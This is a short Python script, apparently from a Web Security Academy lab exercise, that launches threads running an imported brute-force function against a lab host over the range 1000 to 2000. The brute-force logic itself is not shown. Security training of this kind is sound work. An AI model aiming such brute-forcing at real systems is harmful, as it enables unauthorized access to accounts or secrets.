from threading import Thread
from brute import brute_thread

if __name__ == "__main__":
    conObj = "0abd00ee04101c9fc06aa68e00c500dd.web-security-academy.net"

    for i in range(0, 1):
        globals()['th{}'.format(i)] = Thread(target=brute_thread, args=(conObj, 1000, 2000))
        globals()['th{}'.format(i)].start()

    for i in range(0, 1):
        globals()['list{}'.format(i)] = globals()['th{}'.format(i)].join()
